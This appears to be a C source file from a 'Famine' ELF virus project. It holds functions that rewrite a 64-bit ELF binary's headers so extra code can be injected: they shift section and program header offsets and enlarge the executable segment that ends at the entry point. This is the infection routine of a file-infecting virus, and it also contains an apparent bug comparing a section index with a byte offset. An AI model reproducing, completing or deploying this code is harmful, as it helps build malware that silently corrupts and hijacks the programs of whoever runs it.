#include "../include/famine.h"

void change_file_header(size_t size, unsigned char *buf, struct ELFheaders64 *file_header, struct sheaders64 section_hd) {
    if ((size_t)file_header->e_shoff > section_hd.sh_offset) {
        additionSurOctets(&(buf[0x28]), 2, size);
        if (file_header->e_shstrndx > section_hd.sh_offset)
            additionSurOctets(&(buf[0x3E]), 2, size);
    }
    else
        dprintf(1, "section_offset = %ld file_header->e_shoff = %ld\n", section_hd.sh_offset, file_header->e_shoff);
}

void    change_program_offset(size_t size, unsigned char *buf, struct ELFheaders64 file_header) {
    size_t offset = 0;

    for (int i = 0; i < file_header.e_phnum; i++) {
        offset = get_program_header_offset(i, file_header);
        additionSurOctets(&(buf[offset + 0x08]), 8, size);
    }
}

void    change_program_header_offsets(size_t size, unsigned char *buf, int ph_index, struct ELFheaders64 file_header) {
    size_t offset;

    offset = get_program_header_offset(ph_index, file_header);
    additionSurOctets(&(buf[offset + 0x20]), 8, size);
    additionSurOctets(&(buf[offset + 0x28]), 8, size);
}

void    change_program_header(size_t size, unsigned char *buf, struct pheaders64 *pheaders, struct ELFheaders64 elfHeader) {
    
    for (int i = 0; i < elfHeader.e_phnum; i++) {
        if (pheaders[i].p_type == 0x00000001) {
            if (elfHeader.e_entry == (pheaders[i].p_vaddr + pheaders[i].p_memsz)) {
                if (pheaders[i].p_flags & 0x01) {
                    change_program_header_offsets(size, buf, i, elfHeader);
                }
            }
        }
    }
}

void    change_sections_header_offset(size_t size, size_t offset_injection, unsigned char *buf, struct ELFheaders64 elfheader) {
    size_t offset = 0;
    struct sheaders64 *sheaders;

    sheaders = get_section_headers_64(buf, elfheader);

    for (int i = 0; i < elfheader.e_shnum; i++) {
        offset = get_section_header_offset(i, elfheader);
        if (sheaders[i].sh_offset + sheaders[i].sh_size == offset_injection)
            additionSurOctets(&(buf[offset + 0x20]), 8, size);
    }
    free(sheaders);
}